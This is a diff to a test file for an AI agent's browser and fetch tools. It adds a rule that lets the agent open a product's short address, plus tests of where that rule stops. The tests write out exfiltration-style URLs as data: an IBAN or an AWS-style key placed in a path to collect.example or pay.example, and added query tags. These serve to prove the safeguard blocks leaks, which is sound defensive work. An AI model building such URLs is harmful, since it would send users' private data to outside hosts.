@@ -48,7 +48,7 @@ const LIT_UNSEEN = "Not run: this link has not appeared in the conversation, so 
 // link is on the page with a ref that can be clicked, and an address written
 // by hand is a page nobody asked for.
 const LIT_BROWSER_UNSEEN =
-  "Not run: this exact address has not appeared in the conversation, so it was not opened. Use browser_read or browser_find to locate the link, then click its ref. Only if the link carries no ref, copy its whole printed address, including the path and query, and open that; do not shorten or reconstruct the address.";
+  "Not run: this exact address has not appeared in the conversation, so it was not opened. Use browser_read or browser_find to locate the link, then click its ref. Only if the link carries no ref, copy its whole printed address, including the path and query, and open that. A shorter form opens only when it is the same http or https address, spelled the same way, with no query of its own, and with the last piece of its path already printed in a link you have read: the product's own address, for example https://shop.example/dp/B012345678.";
 // The same refusal said to a web_fetch made while the browser has already read
 // a page: the link is on that page, with a ref to click, so it is not told to
 // go and search for it.
@@ -124,8 +124,14 @@ try {
       OPENED.length = 0;
       const opened = await open(href, conversation);
       equal(`find (${text}) preserves the whole printed destination`, [opened.ok, OPENED.at(-1)], [true, href]);
-      const unseen = await open("https://catalog.example/dp/B012345678", conversation);
-      equal(`find (${text}) does not arm a shortened destination`, [unseen.ok, unseen.resultCode], [false, "web.link_unseen"]);
+      // **The short form of what the page printed opens.** The id is in the
+      // link the find brought back, so the product's own address opens — that
+      // is the rule of the short form, and it is what the find's needle was
+      // never about. What the page did **not** print still opens nothing.
+      const short = await open("https://catalog.example/dp/B012345678", conversation);
+      equal(`find (${text}) opens the short form of the id it printed`, [short.ok, OPENED.at(-1)], [true, "https://catalog.example/dp/B012345678"]);
+      const unseen = await open("https://catalog.example/dp/B0123456789", conversation);
+      equal(`find (${text}) does not arm an id it did not print`, [unseen.ok, unseen.resultCode], [false, "web.link_unseen"]);
     }
     const absent = "https://absent.example/collect?value=not-on-the-page";
     pageResult = "url: https://catalog.example/list\ntitle: Catalog\n\nnothing on this page matches that text";
@@ -386,6 +392,281 @@ try {
     equal("a web_fetch of the model's spelling is still refused", [r.ok, r.text], [false, LIT_UNSEEN]);
     r = await searchAttempt("https://www.amazon.it/s?k=computer", named);
     equal("a search carrying the address is still refused", [r.ok, r.resultCode], [false, "web.query_link_unseen"]);
+  }
+
+  // --- the short form of a product -------------------------------------------
+  // A listing prints the whole address of every link on it — path, tracking
+  // tokens, query, hundreds of characters the model cannot copy. What the
+  // model builds instead is the product's own short address, and the exact
+  // rule refused it: measured on a real turn, three tries out of three ended
+  // in `open_unseen` and no product page was ever opened. This is the way
+  // through, and the checks below are its edges.
+  {
+    /** One browser_open call through the real registry, with the web switch on. */
+    const open = (url, conversation) =>
+      executeToolCall("browser_open", { url }, undefined, null, conversation, "any-model", undefined, undefined, true);
+    // What the browser printed: the whole address, with the tokens and the
+    // query a real listing carries.
+    const LONG = "https://www.amazon.it/HP-Laptop-15s-fq5050np/dp/B0GR5ZXR5X/ref=sr_1_3?crid=2K1QF7XH3J9PL8&keywords=laptop&sprefix=computer&sr=8-3";
+    const SHORT = "https://www.amazon.it/dp/B0GR5ZXR5X";
+    const listing = exchange("b3", "browser_read", "{}", [
+      "<kalsa-page-0123456789abcdef01234567>",
+      "url: https://www.amazon.it/s?k=laptop",
+      "title: Amazon.it",
+      "",
+      `- [e3] link [url=${LONG}] "HP Laptop 15s"`,
+      "</kalsa-page-0123456789abcdef01234567>",
+    ].join("\n"));
+
+    // 1. The case of the cell: the short form of a product the listing
+    //    printed opens, and it is the address the model asked for.
+    OPENED.length = 0;
+    let r = await open(SHORT, listing);
+    check("the product's own short address opens", r.ok === true && OPENED.at(-1) === SHORT, `${r.resultCode} ${r.text}`);
+    equal("and the door saw the short address, not the long one", OPENED.length, 1);
+
+    // The same id on the same host, printed by a web result rather than by
+    // the browser: the corpus is the corpus, wherever the address came from.
+    const searched = exchange("s1", "web_search", '{"query":"laptop"}', `1. HP Laptop 15s\n   URL: ${LONG}\n   A headline.`);
+    OPENED.length = 0;
+    r = await open(SHORT, searched);
+    check("the same short address opens after a web result printed it", r.ok === true && OPENED.at(-1) === SHORT, `${r.resultCode} ${r.text}`);
+
+    // 2. An id nobody printed is a piece the model made up: it opens nothing.
+    OPENED.length = 0;
+    r = await open("https://www.amazon.it/dp/B0DIFFERENT1", listing);
+    equal("a short form with an id nobody printed is refused", [r.ok, r.resultCode, r.text], [false, "web.link_unseen", LIT_BROWSER_UNSEEN]);
+    equal("and it opened nothing", OPENED.length, 0);
+    // The id has to be a piece of a **path**: an id that only ever appeared in
+    // a query is a piece of a query, and the short form carries no query.
+    const inQuery = exchange("b4", "browser_read", "{}", [
+      "<kalsa-page-0123456789abcdef01234567>",
+      `- [e3] link [url=https://www.amazon.it/s?k=B0INQUERYONLY] "a search"`,
+      "</kalsa-page-0123456789abcdef01234567>",
+    ].join("\n"));
+    r = await open("https://www.amazon.it/dp/B0INQUERYONLY", inQuery);
+    equal("an id that only ever appeared in a query is refused", [r.ok, r.resultCode, r.text], [false, "web.link_unseen", LIT_BROWSER_UNSEEN]);
+    // And the piece is compared as it is written, not as a word: a name in
+    // another case is a name nobody printed.
+    r = await open("https://www.amazon.it/dp/b0gr5zxr5x", listing);
+    equal("an id in another case is refused", [r.ok, r.resultCode, r.text], [false, "web.link_unseen", LIT_BROWSER_UNSEEN]);
+    equal("and none of them opened anything", OPENED.length, 0);
+
+    // 3. Another host is another site: the same id, a host of its own.
+    r = await open("https://www.other-shop.example/dp/B0GR5ZXR5X", listing);
+    equal("the same id on another host is refused", [r.ok, r.resultCode, r.text], [false, "web.link_unseen", LIT_BROWSER_UNSEEN]);
+    // And `www` is not forgiven here, unlike the homepage rule beside it.
+    r = await open("https://amazon.it/dp/B0GR5ZXR5X", listing);
+    equal("the same id without the www is refused", [r.ok, r.resultCode, r.text], [false, "web.link_unseen", LIT_BROWSER_UNSEEN]);
+    equal("and none of them opened anything", OPENED.length, 0);
+
+    // 4. A query of its own is where data walks out: the short form has none.
+    r = await open("https://www.amazon.it/dp/B0GR5ZXR5X?tag=affiliate-21", listing);
+    equal("a short form with a query of its own is refused", [r.ok, r.resultCode, r.text], [false, "web.link_unseen", LIT_BROWSER_UNSEEN]);
+    equal("and it opened nothing", OPENED.length, 0);
+
+    // 5. A name in front of the host is refused as it is, before any of this.
+    r = await open("https://marco:pw@www.amazon.it/dp/B0GR5ZXR5X", listing);
+    equal("a short form with a name in front of the host is refused as it is", [r.ok, r.resultCode], [false, "web.link_userinfo"]);
+
+    // 6. The other door is untouched: `web_fetch` stays exact.
+    OPENED.length = 0;
+    r = await attempt(SHORT, listing);
+    equal("a web_fetch of the same short address is still refused", [r.ok, r.resultCode], [false, "web.link_unseen"]);
+    equal("and it is the fetch's own refusal, not the browser's", r.text, LIT_UNSEEN_BROWSER);
+    equal("and the door never saw it", OPENED.length, 0);
+
+    // 7. The front door is not a short form, and the homepage rule beside it
+    //    still opens the spelling the person named.
+    r = await open("https://www.amazon.it/", listing);
+    equal("a homepage is not a short form", [r.ok, r.resultCode, r.text], [false, "web.link_unseen", LIT_BROWSER_UNSEEN]);
+    OPENED.length = 0;
+    r = await open("https://www.amazon.it/", [{ role: "user", content: "Apri Amazon.it nel browser." }]);
+    check("the homepage the person named still opens in their own spelling", r.ok === true && OPENED.at(-1) === "https://amazon.it/", `${r.resultCode} ${r.text}`);
+
+    // 8. A secret in the path, already in the conversation, is a secret the
+    //    conversation already carried: the exact address was openable before
+    //    this rule existed, and its short form is the same secret on the same
+    //    host. **This is the case the design already armed** — the parity
+    //    with `web_fetch` is the point, not a new opening.
+    const SECRET = "https://files.example/x/SEGRETO";
+    const secretPage = exchange("f1", "web_fetch", '{"url":"https://files.example/list"}', `the file is at ${SECRET}`);
+    const byFetch = await attempt(SECRET, secretPage);
+    check("the exact address was already openable by web_fetch", byFetch.ok === true, byFetch.text);
+    OPENED.length = 0;
+    const byShort = await open("https://files.example/SEGRETO", secretPage);
+    check("and the short form of it opens on the same host", byShort.ok === true && OPENED.at(-1) === "https://files.example/SEGRETO", `${byShort.resultCode} ${byShort.text}`);
+
+    // 9. **The negative control.** The same case, with the rule compiled out
+    //    of the app: it has to fail there, or the case above proves nothing.
+    {
+      const off = await loadApp({
+        compileOut: {
+          file: "fetchProvenance.ts",
+          from: "const short = shortFormEntry(url, conversation);",
+          to: "const short = null as string | null;",
+        },
+      });
+      try {
+        const refused = await off.app.executeToolCall("browser_open", { url: SHORT }, undefined, null, listing, "any-model", undefined, undefined, true);
+        equal("with the short form compiled out, the case fails", [refused.ok, refused.resultCode], [false, "web.link_unseen"]);
+        equal("and it fails with the rule's own refusal", refused.text, LIT_BROWSER_UNSEEN);
+      } finally {
+        await rm(off.dir, { recursive: true, force: true });
+      }
+    }
+  }
+
+  // --- the short form opens nothing the corpus did not print ----------------
+  // The short form compares the address asked for with the addresses the
+  // conversation carries, piece by piece. The cases below are the readings
+  // that would open an address nobody printed: a secret in the middle of the
+  // path, a piece invented next to a printed one, the other scheme of the
+  // same host, and an id that carries a key.
+  {
+    /** One browser_open call through the real registry, with the web switch on. */
+    const open = (url, conversation) =>
+      executeToolCall("browser_open", { url }, undefined, null, conversation, "any-model", undefined, undefined, true);
+
+    // **A secret in the middle of the path.** The corpus holds one page and
+    // one address; the last piece of the path asked for is printed there and
+    // the middle one is not. The middle one is where data walks out, so the
+    // whole path has to be printed, not only its end.
+    const IBAN = "IBAN-IT60X0542811101000000123456";
+    const promo = exchange("x1", "browser_read", "{}", [
+      "<kalsa-page-0123456789abcdef01234567>",
+      "url: https://collect.example/promo",
+      "title: Promo",
+      "",
+      `- [e1] link [url=https://collect.example/promo] "the promo"`,
+      "</kalsa-page-0123456789abcdef01234567>",
+    ].join("\n"));
+    for (const [label, url] of [
+      ["a secret in the middle of the path", `https://collect.example/${IBAN}/promo`],
+      ["a secret in a path of its own", `https://collect.example/a/${IBAN}/promo`],
+    ]) {
+      OPENED.length = 0;
+      const r = await open(url, promo);
+      equal(`${label} is refused`, [r.ok, r.resultCode], [false, "web.link_unseen"]);
+      equal(`${label} opened nothing`, OPENED.length, 0);
+    }
+
+    // **A printed id put together with a piece that was never printed.** The
+    // id is in the corpus, so the pieces beside it have to be in it too: one
+    // printed path, not a path assembled out of two.
+    const shop = exchange("x2", "browser_read", "{}", [
+      "<kalsa-page-0123456789abcdef01234567>",
+      "url: https://shop.example/dp/B012345678",
+      "",
+      `- [e2] link [url=https://shop.example/dp/B012345678] "the notebook"`,
+      "</kalsa-page-0123456789abcdef01234567>",
+    ].join("\n"));
+    for (const [label, url] of [
+      ["a printed id with an invented piece after it", "https://shop.example/dp/B012345678/collect"],
+      ["a printed id set beside an invented piece", "https://shop.example/B012345678/collect"],
+    ]) {
+      OPENED.length = 0;
+      const r = await open(url, shop);
+      equal(`${label} is refused`, [r.ok, r.resultCode], [false, "web.link_unseen"]);
+      equal(`${label} opened nothing`, OPENED.length, 0);
+    }
+
+    // **The other scheme is another address.** The corpus printed the product
+    // on https; the plain-http spelling of the same host is not the address
+    // that was printed, and the bytes a plain request gets back are not the
+    // bytes a secure one gets back.
+    const LONG = "https://www.amazon.it/HP-Laptop-15s-fq5050np/dp/B0GR5ZXR5X/ref=sr_1_3?crid=2K1QF7XH3J9PL8";
+    const httpsListing = exchange("x3", "browser_read", "{}", [
+      "<kalsa-page-0123456789abcdef01234567>",
+      "url: https://www.amazon.it/s?k=laptop",
+      "",
+      `- [e3] link [url=${LONG}] "HP Laptop 15s"`,
+      "</kalsa-page-0123456789abcdef01234567>",
+    ].join("\n"));
+    OPENED.length = 0;
+    let r = await open("http://www.amazon.it/dp/B0GR5ZXR5X", httpsListing);
+    equal("the same product on http is refused", [r.ok, r.resultCode], [false, "web.link_unseen"]);
+    equal("and it opened nothing", OPENED.length, 0);
+    // The control: on the scheme the corpus printed, the same short address
+    // opens — so the refusal above is about the scheme and nothing else.
+    OPENED.length = 0;
+    r = await open("https://www.amazon.it/dp/B0GR5ZXR5X", httpsListing);
+    check("the same short address on https opens", r.ok === true && OPENED.at(-1) === "https://www.amazon.it/dp/B0GR5ZXR5X", `${r.resultCode} ${r.text}`);
+
+    // **An id that looks like a key is refused before the short form.** The
+    // shape is the one above — every piece of the path is printed — but the
+    // id carries a key the user never typed, and the credential layer runs
+    // first: it fails closed, and the short form never gets to say yes.
+    const KEY = "AKIAIOSFODNN7EXAMPLE";
+    const keyed = exchange("x4", "browser_read", "{}", [
+      "<kalsa-page-0123456789abcdef01234567>",
+      "url: https://pay.example/send",
+      "",
+      `- [e4] link [url=https://pay.example/send/${KEY}/receipt] "the receipt"`,
+      "</kalsa-page-0123456789abcdef01234567>",
+    ].join("\n"));
+    OPENED.length = 0;
+    r = await open(`https://pay.example/send/${KEY}`, keyed);
+    equal("a key-looking id takes the credential refusal, not the short form", [r.ok, r.resultCode], [false, "web.link_credential"]);
+    equal("and it opened nothing", OPENED.length, 0);
+    // The same shape without the key opens: the refusal is about the key.
+    const plain = exchange("x5", "browser_read", "{}", [
+      "<kalsa-page-0123456789abcdef01234567>",
+      "url: https://pay.example/send",
+      "",
+      `- [e5] link [url=https://pay.example/send/PLAINID/receipt] "the receipt"`,
+      "</kalsa-page-0123456789abcdef01234567>",
+    ].join("\n"));
+    OPENED.length = 0;
+    r = await open("https://pay.example/send/PLAINID", plain);
+    check("the same short form without a key in it opens", r.ok === true && OPENED.at(-1) === "https://pay.example/send/PLAINID", `${r.resultCode} ${r.text}`);
+
+    // **What was checked is what opens.** The rule reads the address in its
+    // comparable shape, and the address that leaves is that shape — not the
+    // raw spelling the model wrote, which is a different string.
+    const spelled = exchange("x6", "browser_read", "{}", [
+      "<kalsa-page-0123456789abcdef01234567>",
+      "url: https://shop.example/dp/B012345678?variant=16GB",
+      "",
+      `- [e6] link [url=https://shop.example/dp/B012345678?variant=16GB] "the notebook"`,
+      "</kalsa-page-0123456789abcdef01234567>",
+    ].join("\n"));
+    OPENED.length = 0;
+    r = await open("HTTPS://Shop.Example/dp/B012345678", spelled);
+    check("the short form opens the address that was checked", r.ok === true && OPENED.at(-1) === "https://shop.example/dp/B012345678", `${r.resultCode} ${r.text} / ${OPENED.at(-1)}`);
+
+    // **The control on the fix itself.** With the older rule — the last piece
+    // of the path only, and the host compared without its scheme — the secret
+    // in the middle of the path opens, and so does the other scheme of the
+    // same host. The fix is what closes them.
+    {
+      const pieces = await loadApp({
+        compileOut: {
+          file: "fetchProvenance.ts",
+          from: "return pieces.every((piece) => printed.has(piece));",
+          to: "return printed.has(pieces[pieces.length - 1]);",
+        },
+      });
+      try {
+        const leaked = await pieces.app.executeToolCall("browser_open", { url: `https://collect.example/${IBAN}/promo` }, undefined, null, promo, "any-model", undefined, undefined, true);
+        check("with the last-piece rule the secret in the middle of the path opens", leaked.ok === true, `${leaked.resultCode} ${leaked.text}`);
+      } finally {
+        await rm(pieces.dir, { recursive: true, force: true });
+      }
+      const scheme = await loadApp({
+        compileOut: {
+          file: "fetchProvenance.ts",
+          from: "if (other.origin === asked.origin) onHost.push(other);",
+          to: "if (other.host === asked.host) onHost.push(other);",
+        },
+      });
+      try {
+        const plainHttp = await scheme.app.executeToolCall("browser_open", { url: "http://www.amazon.it/dp/B0GR5ZXR5X" }, undefined, null, httpsListing, "any-model", undefined, undefined, true);
+        check("and with the host compared without its scheme the other scheme opens too", plainHttp.ok === true, `${plainHttp.resultCode} ${plainHttp.text}`);
+      } finally {
+        await rm(scheme.dir, { recursive: true, force: true });
+      }
+    }
   }
 
   // --- a page in front of the model is the way through, not a search ---------
